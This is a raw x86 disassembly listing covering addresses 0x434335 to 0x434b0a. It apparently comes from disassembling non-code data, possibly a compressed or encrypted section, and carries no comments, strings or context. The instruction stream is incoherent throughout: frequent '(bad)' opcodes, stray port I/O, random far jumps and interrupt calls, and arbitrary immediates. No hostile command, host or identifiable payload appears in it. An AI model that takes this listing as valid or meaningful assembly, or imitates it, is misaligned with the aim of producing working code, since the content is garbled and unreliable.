  434335:	fucomp st(6)
  434337:	(bad)  
  434338:	or     DWORD PTR [edx-0x4],esp
  43433b:	out    0x6a,eax
  43433d:	pop    edx
  43433e:	mov    ch,0xa0
  434340:	(bad)  
  434341:	cs pusha 
  434343:	ffree  st(6)
  434345:	pushf  
  434346:	sbb    eax,0xaebc5b31
  43434b:	mov    WORD PTR [ecx],ss
  43434d:	imul   ecx,esi,0x42
  434350:	sub    ebp,DWORD PTR [ecx]
  434352:	pop    ebp
  434353:	mov    eax,ds:0x61214dfc
  434358:	pop    esp
  434359:	sbb    al,0xf0
  43435b:	je     0x4343bb
  43435d:	ins    DWORD PTR es:[edi],dx
  43435e:	or     BYTE PTR [ebx-0x40c8022a],dh
  434364:	cmp    eax,0x397e4b61
  434369:	mov    DWORD PTR [ecx-0x118a1d65],0xedd60d2b
  434373:	test   BYTE PTR [edi],ch
  434375:	outs   dx,DWORD PTR ds:[esi]
  434376:	cwde   
  434377:	mov    ds:0xacd88e62,al
  43437c:	inc    edx
  43437d:	test   al,0xdb
  43437f:	loopne 0x434355
  434381:	jle    0x43433b
  434383:	addr16 pop esi
  434385:	mov    ds:0xdf4bbdcb,eax
  43438a:	aad    0x4
  43438c:	fbld   TBYTE PTR [ebp-0x22]
  43438f:	pushf  
  434390:	aam    0xff
  434392:	pop    edi
  434393:	loope  0x434360
  434395:	add    eax,0xe82ed6b6
  43439a:	sti    
  43439b:	or     eax,0x2bee934d
  4343a0:	adc    DWORD PTR [esi],esi
  4343a2:	fsubr  QWORD PTR [eax]
  4343a4:	pop    edi
  4343a5:	popa   
  4343a6:	xchg   ecx,eax
  4343a7:	movhps xmm6,QWORD PTR [eax+0x9]
  4343ab:	ret    0x4c8d
  4343ae:	jmp    0x5b273a1f
  4343b3:	xchg   edi,eax
  4343b4:	sahf   
  4343b5:	add    eax,0x52769bb7
  4343ba:	add    DWORD PTR [ecx-0x5f4391ed],ebp
  4343c0:	jl     0x43440e
  4343c2:	push   es
  4343c3:	jmp    0x44320a68
  4343c8:	popa   
  4343c9:	ins    BYTE PTR es:[edi],dx
  4343ca:	sbb    BYTE PTR [edi+0x28],0x53
  4343ce:	mov    bh,0xa0
  4343d0:	out    0x24,eax
  4343d2:	and    ebp,DWORD PTR ds:0x190018a2
  4343d8:	pop    ebp
  4343d9:	stos   BYTE PTR es:[edi],al
  4343da:	pop    esp
  4343db:	and    ebx,eax
  4343dd:	sbb    ebx,ebx
  4343df:	xchg   DWORD PTR [esi+0x43],esi
  4343e2:	jae    0x43438c
  4343e4:	ja     0x434443
  4343e6:	sub    al,0x7d
  4343e8:	and    al,BYTE PTR [ecx-0x42]
  4343eb:	adc    BYTE PTR [ecx+0x28c5ed58],dl
  4343f1:	jno    0x43444c
  4343f3:	mov    ds:0xaa2e7006,eax
  4343f8:	jb     0x434462
  4343fa:	mov    eax,eax
  4343fc:	fisubr WORD PTR [esi]
  4343fe:	neg    esp
  434400:	in     eax,0x3d
  434402:	sub    eax,0x88635ece
  434407:	test   ebx,ebp
  434409:	or     edi,DWORD PTR [edi]
  43440b:	fmul   DWORD PTR [edx-0x285e83dc]
  434411:	retf   
  434412:	js     0x434419
  434414:	jb     0x434449
  434416:	test   DWORD PTR [edi-0x7247c8a5],esp
  43441c:	sub    al,0x30
  43441e:	sahf   
  43441f:	idiv   DWORD PTR [esi+0x5c]
  434422:	sub    DWORD PTR [ecx-0x7e167291],esp
  434428:	push   esp
  434429:	mov    eax,?
  43442b:	in     eax,dx
  43442c:	pop    esi
  43442d:	cmc    
  43442e:	push   ss
  43442f:	xchg   ecx,eax
  434430:	bound  ebx,QWORD PTR [edi]
  434432:	int3   
  434433:	lea    esp,[ebx+0x45c7c44]
  434439:	mov    eax,ds:0xfdcc574d
  43443e:	push   eax
  43443f:	inc    eax
  434440:	pop    esi
  434441:	pop    eax
  434442:	jb     0x434433
  434444:	adc    eax,0xfb6d5401
  434449:	pusha  
  43444a:	pop    ss
  43444b:	sahf   
  43444c:	pop    es
  43444d:	out    dx,eax
  43444e:	mov    DWORD PTR [edi+ecx*1],ebp
  434451:	imul   ebp,esi,0x51ecdbe5
  434457:	mov    dl,0xed
  434459:	repnz out 0xa3,al
  43445c:	xchg   esp,eax
  43445d:	loopne 0x434458
  43445f:	fidivr WORD PTR [ebp+0x2]
  434462:	arpl   bx,bx
  434464:	add    DWORD PTR [eax+0x25],0x78
  434468:	mov    eax,ds:0xa845ee6b
  43446d:	call   0xec9931d5
  434472:	mov    edx,0x3f7a57a0
  434477:	lahf   
  434478:	stos   DWORD PTR es:[edi],eax
  434479:	ja     0x434448
  43447b:	cmp    eax,0x9e617f59
  434480:	mov    ecx,DWORD PTR [esi+ebp*2+0x17a659d0]
  434487:	mov    ds:0x398bcd6b,al
  43448c:	cmp    edi,edi
  43448e:	int3   
  43448f:	mov    al,0xfd
  434491:	mov    ds:0xdd8120ee,al
  434496:	jbe    0x4344c8
  434498:	(bad)  
  43449a:	cmp    esp,DWORD PTR [ecx+0x4d2bc9c3]
  4344a0:	jbe    0x4344c3
  4344a2:	gs leave 
  4344a4:	pop    esi
  4344a5:	dec    ecx
  4344a6:	cmp    DWORD PTR ds:0x435fb70f,esp
  4344ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4344ad:	shl    BYTE PTR fs:[ecx+0x77fcb8de],0x61
  4344b5:	pop    edx
  4344b6:	(bad)
  4344b9:	cmp    eax,0x57f5a0b4
  4344be:	pusha  
  4344bf:	aaa    
  4344c0:	dec    ebx
  4344c1:	(bad)  
  4344c2:	loop   0x43452c
  4344c4:	mov    ch,0x60
  4344c6:	fisubr WORD PTR [eax+eax*8+0x4f5696dd]
  4344cd:	das    
  4344ce:	jmp    0xcd489a1a
  4344d3:	dec    eax
  4344d4:	sahf   
  4344d5:	test   BYTE PTR [edx],bl
  4344d7:	shr    BYTE PTR [edx+0x51],0x63
  4344db:	pop    esi
  4344dc:	pushf  
  4344dd:	jbe    0x4344a6
  4344df:	pop    ds
  4344e0:	sahf   
  4344e1:	mov    al,0x64
  4344e3:	ja     0x43449c
  4344e5:	xchg   esi,ebp
  4344e7:	jno    0x43449d
  4344e9:	xor    BYTE PTR [eax+0x5c257f17],0xa1
  4344f0:	inc    ebx
  4344f1:	aam    0xd7
  4344f3:	int    0xb8
  4344f5:	xor    al,0x3
  4344f7:	adc    DWORD PTR [eax+edx*8-0x35],edx
  4344fb:	pop    edi
  4344fc:	fistp  QWORD PTR [eax-0x78]
  4344ff:	add    dl,BYTE PTR [ecx+eax*1]
  434502:	(bad)  
  434503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434504:	adc    ah,BYTE PTR [ecx+0x44]
  434507:	cmp    eax,0x8f7631a
  43450c:	dec    eax
  43450d:	pushf  
  43450e:	in     eax,dx
  43450f:	mov    ecx,?
  434511:	ret    
  434512:	jecxz  0x43458d
  434514:	pop    ebp
  434515:	mov    ebx,DWORD PTR [edi]
  434517:	bound  ecx,QWORD PTR [esp+edi*2]
  43451a:	iret   
  43451b:	push   0xcdee8507
  434520:	das    
  434521:	mov    dh,0xf3
  434523:	aad    0x85
  434525:	in     al,dx
  434526:	mov    edx,DWORD PTR [ebx-0x5ec82df0]
  43452c:	jmp    0x1aa14fb8
  434531:	mov    ds:0x232891ee,al
  434536:	cmc    
  434537:	out    0x94,eax
  434539:	scas   eax,DWORD PTR es:[edi]
  43453a:	pop    eax
  43453b:	mov    eax,ds:0x26855c7f
  434540:	pop    ds
  434541:	adc    eax,0x68574597
  434546:	mov    edx,DWORD PTR [edx+0x18]
  434549:	shr    BYTE PTR [ebx],cl
  43454b:	dec    esi
  43454c:	pop    ebp
  43454d:	loope  0x4345ac
  43454f:	push   ebx
  434550:	imul   esp,DWORD PTR [eax+0x9],0x9a557d8f
  434557:	jns    0x434549
  434559:	test   dh,ch
  43455b:	lock cld 
  43455d:	dec    eax
  43455e:	aam    0xaf
  434560:	scas   al,BYTE PTR es:[edi]
  434561:	push   ds
  434562:	popa   
  434563:	mov    eax,ds:0xe5bde53b
  434568:	push   es
  434569:	in     al,dx
  43456a:	addr16 popf 
  43456c:	pop    esi
  43456d:	pop    ebx
  43456e:	mov    esp,0x82642453
  434573:	outs   dx,DWORD PTR ds:[esi]
  434574:	add    BYTE PTR [ecx+0x31],ah
  434577:	pop    ecx
  434578:	imul   esp,DWORD PTR [edi],0xfffffffd
  43457b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43457c:	jbe    0x4345d2
  43457e:	fnsave [edx+0x79d2735e]
  434584:	xchg   esp,eax
  434585:	and    eax,0x60eb750d
  43458a:	fstp   DWORD PTR [edx]
  43458c:	push   0xc00e3556
  434591:	jmp    0x41e6684
  434596:	add    dl,ch
  434598:	adc    ch,BYTE PTR [eax]
  43459a:	sbb    al,0xa8
  43459c:	mov    ebx,cs
  43459e:	inc    edx
  43459f:	mov    edi,0x4515076
  4345a4:	sbb    dl,al
  4345a6:	out    dx,al
  4345a7:	pop    edi
  4345a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4345a9:	lahf   
  4345aa:	lea    ebp,[esi]
  4345ac:	pop    ecx
  4345ad:	jge    0x434626
  4345af:	mov    eax,ds:0xf979ab4e
  4345b4:	adc    DWORD PTR [ebp+0x385e74d3],0x62
  4345bb:	and    ebp,0x7f
  4345be:	stos   BYTE PTR es:[edi],al
  4345bf:	arpl   WORD PTR [edi-0xd0cf6a0],cx
  4345c5:	add    al,BYTE PTR ds:0xeeebc14d
  4345cb:	gs xchg edi,eax
  4345cd:	jae    0x4345d6
  4345cf:	jmp    0x4345a4
  4345d1:	dec    esp
  4345d2:	ins    DWORD PTR es:[edi],dx
  4345d3:	xor    esp,esi
  4345d5:	push   ecx
  4345d6:	out    0x31,al
  4345d8:	or     eax,0xaa020e90
  4345dd:	sahf   
  4345de:	call   DWORD PTR [ebp+0x5e]
  4345e1:	inc    ebx
  4345e2:	bound  esi,QWORD PTR [ebx-0x1a773fab]
  4345e8:	imul   DWORD PTR [ebx+edi*4-0x43bc5b60]
  4345ef:	xchg   edx,eax
  4345f1:	cmc    
  4345f2:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4345f4:	pop    ebp
  4345f5:	push   0xde2afb84
  4345fa:	mov    BYTE PTR [edx-0x62],0xa6
  4345fe:	sbb    eax,0x6df08aa4
  434603:	psubsb mm6,QWORD PTR [edx+0x6e]
  434607:	and    edi,DWORD PTR [ebp-0x7b]
  43460a:	pop    esp
  43460b:	or     dl,BYTE PTR [ebx-0x6e]
  43460e:	sar    BYTE PTR [edx+0x10],cl
  434611:	cs in  eax,dx
  434613:	inc    esp
  434614:	iret   
  434615:	mov    WORD PTR [eax-0x37797d77],?
  43461b:	fwait
  43461c:	xor    ecx,ebx
  43461e:	sbb    DWORD PTR [esi+ebx*2-0x44],esp
  434622:	cmp    ch,dh
  434624:	jae    0x4345f3
  434626:	pusha  
  434627:	xor    eax,0x8d45625e
  43462c:	scas   al,BYTE PTR es:[edi]
  43462d:	test   DWORD PTR [edi+0x69],esp
  434630:	popaw  
  434632:	xor    eax,0x4ab85d82
  434637:	jns    0x43461b
  434639:	mov    ah,0xf0
  43463b:	iret   
  43463c:	sahf   
  43463d:	mov    BYTE PTR [eax+0x10ba1da0],ch
  434643:	dec    edi
  434644:	lods   eax,DWORD PTR ds:[esi]
  434645:	gs and eax,0x5e
  434649:	or     al,0x5a
  43464b:	jmp    0xe856:0x9ccc9c5b
  434652:	push   ss
  434653:	int3   
  434654:	js     0x434666
  434656:	fisub  DWORD PTR [eax-0x32b29fa6]
  43465c:	dec    ebp
  43465d:	cmp    DWORD PTR [ecx+0x51915ebe],esp
  434663:	jl     0x434672
  434665:	(bad)  
  434666:	pusha  
  434667:	cmp    edx,ebx
  434669:	pusha  
  43466a:	jno    0x43461d
  43466c:	dec    esp
  43466d:	cld    
  43466e:	cmc    
  43466f:	ror    BYTE PTR [edx+0x2984eed7],0xea
  434676:	xor    eax,ebp
  434678:	push   0xb8a0bdf1
  43467d:	cld    
  43467e:	out    0xfe,eax
  434680:	push   0xffffff90
  434682:	push   ds
  434683:	xchg   edx,eax
  434684:	pop    ebx
  434685:	out    0x69,al
  434687:	aas    
  434688:	jmp    0xe70344b5
  43468d:	lahf   
  43468e:	leave  
  43468f:	mov    ds:0x5212c130,eax
  434694:	add    DWORD PTR [ecx-0x6a],eax
  434697:	xchg   edx,eax
  434698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434699:	scas   al,BYTE PTR es:[edi]
  43469a:	out    dx,al
  43469b:	call   0xc790:0x7c2eacb0
  4346a2:	outs   dx,DWORD PTR ds:[esi]
  4346a3:	mov    ds:0xb6db6d06,al
  4346a8:	lods   al,BYTE PTR ds:[esi]
  4346a9:	jge    0x434687
  4346ab:	dec    ecx
  4346ac:	(bad)  [eax]
  4346ae:	cli    
  4346af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4346b0:	pop    esi
  4346b1:	cdq    
  4346b2:	xchg   BYTE PTR [edi],al
  4346b4:	sar    cl,0x2a
  4346b7:	inc    eax
  4346b8:	xchg   edi,eax
  4346b9:	pusha  
  4346ba:	jae    0x4346e0
  4346bc:	push   es
  4346bd:	mov    esi,0xd464c619
  4346c2:	out    dx,al
  4346c3:	inc    eax
  4346c4:	outs   dx,BYTE PTR ds:[esi]
  4346c5:	mov    esi,0x5b1ae234
  4346ca:	cmp    ecx,DWORD PTR [edi+0x21f52f2e]
  4346d0:	push   esp
  4346d1:	xor    eax,0x414ad3ce
  4346d6:	repnz mov BYTE PTR [ebx-0x6e],bl
  4346da:	scas   eax,DWORD PTR es:[edi]
  4346db:	or     DWORD PTR [edi+0xce50be2],esi
  4346e1:	shr    DWORD PTR [ebx],0x4
  4346e4:	mov    fs,WORD PTR [eax+0x19]
  4346e7:	cs push esp
  4346e9:	je     0x4346e3
  4346eb:	jle    0x43468f
  4346ed:	sbb    eax,0x2cc717ee
  4346f2:	adc    bl,BYTE PTR [esi-0x5ee07ac3]
  4346f8:	push   0x3e
  4346fa:	add    al,0x3d
  4346fc:	xor    BYTE PTR [ecx],ah
  4346fe:	cs (bad) 
  434700:	mov    esi,0xf5a5c2d7
  434705:	mov    esi,0x3709a210
  43470a:	in     eax,dx
  43470b:	ror    BYTE PTR [esi-0xa],1
  43470e:	shl    ebp,0x9e
  434711:	xor    eax,0xc95a19d
  434716:	aas    
  434717:	jae    0x434790
  434719:	test   al,0xf1
  43471b:	add    edx,DWORD PTR [edi+edi*8+0x1e]
  43471f:	and    DWORD PTR [esi+0x6c3e1ac3],ebx
  434725:	cwde   
  434726:	pushf  
  434727:	nop
  434728:	outs   dx,DWORD PTR ds:[esi]
  434729:	xlat   BYTE PTR ds:[ebx]
  43472a:	push   ebp
  43472b:	mov    eax,ds:0x75f3e797
  434730:	or     eax,0xbdd7eec8
  434735:	inc    eax
  434736:	loop   0x43474e
  434738:	xor    ecx,esp
  43473a:	fldenv [ebx+0x79e19b81]
  434740:	adc    bh,BYTE PTR [edx-0x4ef0428a]
  434746:	out    dx,al
  434747:	mov    ds:0x8f15d0f4,eax
  43474c:	(bad)  
  43474d:	scas   al,BYTE PTR es:[edi]
  43474e:	dec    esi
  43474f:	mov    eax,ds:0x8be6ac1b
  434754:	popa   
  434755:	out    0x2d,al
  434757:	adc    BYTE PTR [esi+0x47],bl
  43475a:	xor    ah,BYTE PTR [ebx+0x5c]
  43475d:	repnz pusha 
  43475f:	fs inc edx
  434761:	pusha  
  434762:	jge    0x434782
  434764:	xchg   esi,eax
  434765:	push   esi
  434766:	out    0x84,eax
  434768:	daa    
  434769:	and    DWORD PTR [edx-0x4e],ecx
  43476c:	fs push esi
  43476e:	jmp    0x4347c4
  434770:	add    dh,BYTE PTR [ebx]
  434772:	jp     0x434760
  434774:	mov    eax,0x56112fa5
  434779:	ins    DWORD PTR es:[edi],dx
  43477a:	mov    cl,0xa0
  43477c:	jmp    0x49d2:0x998411a7
  434783:	int    0x5d
  434785:	loop   0x43478a
  434787:	or     eax,0xba42e678
  43478c:	xchg   edx,eax
  43478d:	jmp    0xcdee:0x5307c8c9
  434794:	jle    0x434724
  434796:	jae    0x4347ee
  434798:	jne    0x434771
  43479a:	out    dx,al
  43479b:	std    
  43479c:	dec    esi
  43479d:	int    0x95
  43479f:	enter  0xbad8,0x80
  4347a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4347a4:	xor    dl,bl
  4347a6:	into   
  4347a7:	mov    esi,0x695e8ae8
  4347ac:	clc    
  4347ad:	push   edi
  4347ae:	out    0xc4,eax
  4347b0:	inc    ebx
  4347b1:	xor    eax,0xfbce939f
  4347b6:	sbb    DWORD PTR [esi+0x7d],0x60
  4347ba:	ror    DWORD PTR [ebp+0x1e],cl
  4347bd:	and    eax,DWORD PTR ds:0x48e5aeba
  4347c3:	xchg   ebp,eax
  4347c4:	pop    esi
  4347c5:	test   al,0xf8
  4347c7:	adc    DWORD PTR [eax],edx
  4347c9:	and    eax,0x611352cc
  4347ce:	repz (bad) 
  4347d0:	cld    
  4347d1:	push   edx
  4347d2:	dec    ebx
  4347d3:	(bad)  
  4347d4:	cli    
  4347d5:	or     dl,ch
  4347d7:	into   
  4347d8:	add    edi,esi
  4347da:	push   ds
  4347db:	stc    
  4347dc:	sahf   
  4347dd:	in     al,dx
  4347de:	or     DWORD PTR es:[edi],edx
  4347e1:	popa   
  4347e2:	retf   
  4347e3:	jecxz  0x434848
  4347e5:	aas    
  4347e6:	dec    ebp
  4347e7:	nop
  4347e8:	lea    esi,[edx-0xcc29e13]
  4347ee:	or     BYTE PTR [edi],0x9f
  4347f1:	mov    al,0x5a
  4347f3:	mov    ch,0x29
  4347f5:	or     DWORD PTR [esi-0x4a],eax
  4347f8:	pop    esi
  4347f9:	pusha  
  4347fa:	push   es
  4347fb:	retf   0xd061
  4347fe:	mov    eax,0xeeaa6ef6
  434803:	push   esp
  434804:	shl    DWORD PTR [edx+0x13],cl
  434807:	mov    ebx,0xa162bc5a
  43480c:	cwde   
  43480d:	mov    bh,0x72
  43480f:	dec    ecx
  434810:	pop    ss
  434811:	rol    ebp,cl
  434813:	adc    ah,BYTE PTR [ebx-0x54]
  434816:	pop    esi
  434817:	cli    
  434818:	add    ecx,esp
  43481a:	cmp    DWORD PTR [edx],0x6f
  43481d:	push   es
  43481e:	in     eax,dx
  43481f:	mov    al,ds:0x924924a0
  434824:	or     esi,ebx
  434826:	xlat   BYTE PTR ds:[ebx]
  434827:	push   ss
  434828:	pop    esi
  434829:	rcl    BYTE PTR [eax+0x19],1
  43482c:	add    BYTE PTR [edi+0x29],bh
  43482f:	push   esp
  434830:	pop    es
  434831:	mov    edi,0xab1cf512
  434836:	in     eax,0xad
  434838:	adc    DWORD PTR [ebx],ecx
  43483a:	out    dx,al
  43483b:	push   edi
  43483c:	adc    eax,0x97e0a1a6
  434841:	xor    BYTE PTR [edi],bl
  434843:	(bad)  
  434844:	ds loope 0x43489e
  434847:	ins    DWORD PTR es:[edi],dx
  434848:	arpl   WORD PTR [ecx+0x609fc81c],sp
  43484e:	fs sub ah,ch
  434851:	out    dx,eax
  434852:	jmp    FWORD PTR [ebp-0x38a7c581]
  434858:	push   esp
  434859:	sub    ebx,DWORD PTR [ecx-0x513921c3]
  43485f:	ss dec esi
  434861:	xchg   esp,eax
  434862:	jl     0x4347f1
  434864:	shr    DWORD PTR [eax],1
  434866:	sub    BYTE PTR [ecx-0x2110e8cc],ah
  43486c:	sub    ebp,ebx
  43486e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43486f:	pop    es
  434870:	pop    esi
  434871:	inc    ebp
  434872:	xor    al,0x76
  434874:	xchg   edx,eax
  434875:	outs   dx,BYTE PTR ds:[esi]
  434876:	mov    edx,0x36613a0d
  43487b:	jge    0x43481c
  43487d:	imul   ebx,DWORD PTR [ebp-0x11c6760a],0x71980fcd
  434887:	mov    esi,0xa185fa1a
  43488c:	add    al,0x90
  43488e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43488f:	sub    BYTE PTR [ebp+0x60b87985],0x81
  434896:	fld    QWORD PTR [edx-0x28]
  434899:	xor    BYTE PTR [esi+0x1b],ah
  43489c:	mov    esi,0xfc88eb37
  4348a1:	mov    esi,0x4095116b
  4348a6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4348a8:	jae    0x434918
  4348aa:	jmp    0x9e61547a
  4348af:	jl     0x434906
  4348b1:	push   eax
  4348b2:	in     eax,dx
  4348b3:	in     al,dx
  4348b4:	adc    eax,DWORD PTR [eax]
  4348b6:	cmp    BYTE PTR [ebx],0x2b
  4348b9:	bound  edi,QWORD PTR ds:[ebp+0x57]
  4348bd:	jnp    0x434871
  4348bf:	pop    ecx
  4348c0:	fbld   TBYTE PTR [eax-0x3f]
  4348c3:	xchg   edx,eax
  4348c4:	xchg   BYTE PTR [edi],cl
  4348c6:	pop    edx
  4348c7:	jl     0x4348fc
  4348c9:	jmp    0x4348ec
  4348cb:	(bad)  
  4348cd:	adc    al,al
  4348cf:	in     al,dx
  4348d0:	sahf   
  4348d1:	jae    0x43485c
  4348d3:	mov    ah,0x90
  4348d5:	xlat   BYTE PTR ds:[ebx]
  4348d6:	call   0x78c2a17b
  4348db:	cmc    
  4348dc:	fnstcw WORD PTR [ecx+0x67517aa3]
  4348e2:	call   0xda78:0xb841ef2
  4348e9:	xchg   ecx,eax
  4348ea:	mov    ah,0x78
  4348ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4348ed:	pusha  
  4348ee:	enter  0x7739,0x8d
  4348f2:	jno    0x43488b
  4348f4:	cmp    edi,DWORD PTR [eax-0x170def12]
  4348fa:	jne    0x43490b
  4348fc:	sbb    al,BYTE PTR [ecx-0x79]
  4348ff:	scas   al,BYTE PTR es:[edi]
  434900:	test   BYTE PTR [ebx],0xee
  434903:	jo     0x4348a8
  434905:	lods   al,BYTE PTR ds:[esi]
  434906:	imul   eax,esp,0x35e7234d
  43490c:	mov    dl,0xfd
  43490e:	push   DWORD PTR [edx]
  434910:	(bad)  
  434911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434912:	fidiv  DWORD PTR [edi-0x78739e99]
  434918:	jle    0x43492e
  43491a:	loope  0x434924
  43491c:	aam    0x76
  43491e:	out    dx,al
  43491f:	cmp    BYTE PTR [ebp-0x52],ch
  434922:	repnz lahf 
  434924:	mov    eax,0x66a0cfcd
  434929:	inc    ebx
  43492a:	fst    DWORD PTR ds:0xc3d0923b
  434930:	pop    esi
  434931:	fiadd  DWORD PTR [ecx]
  434933:	dec    edx
  434934:	mov    ds:0x921116b5,al
  434939:	push   edx
  43493a:	xchg   edx,eax
  43493b:	cdq    
  43493c:	(bad)  [edx-0x2b018710]
  434942:	jg     0x434918
  434944:	cmp    DWORD PTR [eax],ebx
  434946:	out    dx,al
  434947:	outs   dx,DWORD PTR ds:[esi]
  434948:	bnd jle 0x4349c6
  43494b:	adc    DWORD PTR [ebx-0x655f0f21],edx
  434951:	aad    0x81
  434953:	arpl   WORD PTR [ebx+0x718e3a8a],di
  434959:	nop
  43495a:	mov    dh,0x71
  43495c:	pop    esi
  43495d:	adc    cl,BYTE PTR [ebx+0x45]
  434960:	xchg   ebp,eax
  434961:	xor    ebx,eax
  434963:	and    al,0xf4
  434965:	sub    eax,DWORD PTR [ecx-0xf03c55f]
  43496b:	dec    edi
  43496c:	out    dx,al
  43496d:	mov    al,0x9c
  43496f:	mov    bl,0x5d
  434971:	cmp    esi,DWORD PTR [edx]
  434973:	pop    ds
  434974:	xor    DWORD PTR [edi+edx*8+0x7e],ebp
  434978:	jb     0x43491c
  43497a:	cld    
  43497b:	mov    al,ds:0xdc11195d
  434980:	sbb    cl,dl
  434982:	xor    DWORD PTR [ebx],0xb7b1a23a
  434988:	pop    esi
  434989:	arpl   WORD PTR [esi-0x25730521],ax
  43498f:	mov    al,ds:0x1d6a6cb8
  434994:	xor    eax,DWORD PTR ds:0xe15ed4c9
  43499a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43499b:	and    DWORD PTR [edx-0x7e],ebp
  43499e:	jle    0x4349c8
  4349a0:	jo     0x4349f4
  4349a2:	mov    ch,0x9f
  4349a4:	stos   BYTE PTR es:[edi],al
  4349a5:	inc    ebp
  4349a6:	outs   dx,BYTE PTR ds:[esi]
  4349a7:	and    BYTE PTR [ecx],dl
  4349a9:	add    BYTE PTR [eax-0x4],bl
  4349ac:	pop    esi
  4349ad:	out    0x6,al
  4349af:	fld    QWORD PTR [edx+0x7d387ced]
  4349b5:	add    ax,0x4cf4
  4349b9:	ret    
  4349ba:	in     al,0xa0
  4349bc:	mov    ebx,0xddbdc1e2
  4349c1:	pop    ds
  4349c2:	out    dx,eax
  4349c3:	xchg   esp,eax
  4349c4:	and    eax,0xb9dbf0a9
  4349c9:	ffree  st(2)
  4349cb:	aaa    
  4349cc:	jb     0x4349ce
  4349ce:	pop    ss
  4349cf:	add    BYTE PTR [eax+eiz*2+0x55c96e9c],bh
  4349d6:	pusha  
  4349d7:	sub    dl,BYTE PTR [edx-0x47]
  4349da:	out    dx,al
  4349db:	scas   eax,DWORD PTR es:[edi]
  4349dc:	adc    eax,0xcfc84dbf
  4349e1:	dec    ecx
  4349e2:	push   edi
  4349e3:	mov    eax,ds:0xc297ffa6
  4349e8:	push   0x67700b7c
  4349ed:	(bad)  
  4349ee:	ins    DWORD PTR es:[edi],dx
  4349ef:	adc    eax,0xc704e15f
  4349f4:	and    al,BYTE PTR [edi-0x52ac9752]
  4349fa:	add    ebx,DWORD PTR [edi+ecx*1+0x5eed4ee9]
  434a01:	add    BYTE PTR [edx-0x613cbaf8],0x95
  434a08:	pop    esi
  434a09:	sub    al,bl
  434a0b:	dec    esp
  434a0c:	std    
  434a0d:	mov    dh,0x7
  434a0f:	push   0x77
  434a11:	pusha  
  434a12:	adc    al,0xb1
  434a14:	(bad)  
  434a15:	mov    dl,0x74
  434a17:	adc    bh,dl
  434a19:	outs   dx,BYTE PTR ds:[esi]
  434a1a:	lods   ax,WORD PTR ds:[esi]
  434a1c:	pop    esi
  434a1d:	push   ebx
  434a1e:	xor    eax,DWORD PTR [esi]
  434a20:	push   edi
  434a21:	mov    ebp,0x607640ae
  434a26:	hlt    
  434a27:	fimul  DWORD PTR [ecx]
  434a29:	or     bh,BYTE PTR [ecx-0x4f]
  434a2c:	add    BYTE PTR [esi],al
  434a2e:	out    dx,al
  434a2f:	push   0xffffff9d
  434a31:	dec    ebx
  434a32:	repnz lods al,BYTE PTR ds:[esi]
  434a34:	pop    ebx
  434a35:	pop    ecx
  434a36:	cmp    al,0x6d
  434a38:	jp     0x434a9a
  434a3a:	jne    0x434ab3
  434a3c:	dec    ebx
  434a3e:	test   DWORD PTR [eax-0x1e18c4ed],eax
  434a44:	iret   
  434a45:	push   ds
  434a46:	ins    DWORD PTR es:[edi],dx
  434a47:	pop    ecx
  434a48:	sub    eax,DWORD PTR [eax-0x2dae6852]
  434a4e:	data16 ja 0x434a84
  434a51:	popa   
  434a52:	or     dh,BYTE PTR [ecx]
  434a54:	fs ss je 0x434a0d
  434a58:	ror    esi,1
  434a5a:	out    dx,al
  434a5b:	xor    edx,DWORD PTR [esi-0x68]
  434a5e:	xor    BYTE PTR ds:0x7fa41ecb,ch
  434a64:	addr16 popa 
  434a66:	gs pop es
  434a68:	int3   
  434a69:	fsub   st,st(7)
  434a6b:	inc    ecx
  434a6c:	sbb    al,BYTE PTR [edi-0x27c8c501]
  434a72:	sub    eax,0x6a17b0d8
  434a77:	out    dx,al
  434a78:	jb     0x434a30
  434a7a:	push   0xf160f36f
  434a7f:	mov    ds:0xed95188d,al
  434a84:	shr    BYTE PTR [eax+0xcbfbee],cl
  434a8a:	lods   eax,DWORD PTR cs:[esi]
  434a8c:	pushf  
  434a8d:	out    dx,al
  434a8e:	dec    edx
  434a8f:	mov    eax,ds:0xec9b3cd8
  434a94:	mov    eax,ds:0x314b406a
  434a99:	add    BYTE PTR [ecx+0x1f],cl
  434a9c:	sbb    eax,0x99818134
  434aa1:	stc    
  434aa2:	xor    bl,BYTE PTR [edi+0x35d95e08]
  434aa8:	mov    al,0x72
  434aaa:	mov    al,ds:0xc1028ea6
  434aaf:	pop    es
  434ab0:	pop    esi
  434ab1:	adc    al,0x74
  434ab3:	jg     0x434a77
  434ab5:	daa    
  434ab6:	rcr    dl,1
  434ab8:	cs data16 int 0x4a
  434abc:	fstp   QWORD PTR [ebp+eiz*4+0x6d5cf120]
  434ac3:	test   DWORD PTR [ebp-0xe],ebx
  434ac6:	out    dx,al
  434ac7:	pop    es
  434ac8:	push   eax
  434ac9:	(bad)
  434acc:	push   0x42a30ce5
  434ad1:	loope  0x434aab
  434ad3:	xchg   eax,edi
  434ad5:	leave  
  434ad6:	into   
  434ad7:	and    al,BYTE PTR [ebx-0x45]
  434ada:	jle    0x434a9a
  434adc:	pop    esi
  434add:	imul   esi,DWORD PTR ds:0xd7761cff,0xbdaa7f09
  434ae7:	mov    al,ds:0xaf3d4ba3
  434aec:	and    bh,BYTE PTR [eax]
  434aee:	dec    esp
  434aef:	mov    cl,0x2e
  434af1:	cs jnp 0x434b2b
  434af4:	cwde   
  434af5:	jmp    0x271411c7
  434afa:	or     BYTE PTR [ecx+0xd7d4258],ah
  434b00:	outs   dx,DWORD PTR ds:[esi]
  434b01:	fsubr  st,st(7)
  434b03:	loope  0x434a96
  434b05:	pop    ebp
  434b06:	xchg   ecx,eax
  434b07:	aas    
  434b08:	sub    esp,eax
  434b0a:	aaa    
